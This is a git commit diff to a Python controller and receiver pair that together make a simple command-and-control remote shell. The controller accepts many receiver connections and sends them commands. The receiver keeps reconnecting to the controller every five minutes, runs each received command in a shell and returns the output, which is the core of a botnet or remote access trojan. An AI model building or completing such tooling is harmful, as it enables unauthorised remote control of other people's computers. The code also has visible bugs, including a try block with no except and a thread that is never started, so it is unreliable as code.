2ff15e5de8ae7638e3839e56efced3b073c936a8
flything45 <flything45@gmail.com>
2024-10-06 12:23:03 +0100

    controller allows multiple connections

--- controller.py
+++ controller.py
@@ -1,6 +1,19 @@
 import socket
 import threading
-#from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives.asymmetric import rsa
+'''
+def handleConnection(connection, address):
+    while True:
+        command = input(">> ")
+        if command == "exit":
+            connection.close()
+            break
+        connection.send(bytes(command, FORMAT))
+        output = connection.recv(BUFFER_SIZE)
+        print(output.decode(FORMAT))
+'''
+
+connections = {}
 
 SELF = socket.gethostbyname(socket.gethostname())
 PORT = 5050
@@ -10,14 +23,29 @@ SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 SOCKET.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 SOCKET.bind((SELF, PORT))
 
-SOCKET.listen()
-connection, address = SOCKET.accept()
+def acceptConnections():
+    SOCKET.listen()
+    while True:
+        connection, address = SOCKET.accept()
+        connections[address] = connection
+
+def sendCommand(addr, cmd):
+    conn = connections[addr]
+    conn.send(bytes(cmd, FORMAT))
+    print(conn.recv(BUFFER_SIZE).decode(FORMAT))
+
+def disconnectAll():
+    #terminate all connections
+    #receivers should go into standby mode
+    for addr in connections:
+        connections[addr].send(bytes("HOST_DISCONNECT", FORMAT))
+
+thread = threading.Thread(target=acceptConnections)
+thread.start()
+
+print("address:command")
 
 while True:
-    command = input(">> ")
-    if command == "exit":
-        connection.close()
-        break
-    connection.send(bytes(command, FORMAT))
-    output = connection.recv(BUFFER_SIZE)
-    print(output)
+    command = input(">")
+    commandThread = threading.Thread(target=sendCommand, args=(command))
+
--- receiver.py
+++ receiver.py
@@ -1,6 +1,7 @@
 import socket
 from subprocess import check_output
-#from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives.asymmetric import rsa
+from time import sleep
 
 SELF = socket.gethostbyname(socket.gethostname())
 PORT = 5051
@@ -11,9 +12,20 @@ SOCKET.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 SOCKET.bind((SELF, PORT))
 
 HOST = "ENTER CONTROLLER IP ADDRESS HERE"
-#using this computer's IP address temporarily for testing on the same computer
-SOCKET.connect((SELF, 5050))
 
 while True:
-    command = SOCKET.recv(BUFFER_SIZE).decode(FORMAT).split(" ")
-    SOCKET.send(check_output(command, shell=True))
+    #standby mode (trying to connect to the controller until successful )
+    successful = False
+    while not successful:
+        try:
+            #using this computer's IP address temporarily for testing on the same computer
+            SOCKET.connect((SELF, 5050))
+            successful = True
+        if not successful: sleep(300)
+    #active mode (executing commands from the controller)
+    while True:
+        command = SOCKET.recv(BUFFER_SIZE).decode(FORMAT).split(" ")
+        if command[0] == "exit":
+            break
+        SOCKET.send(check_output(command, shell=True))
+
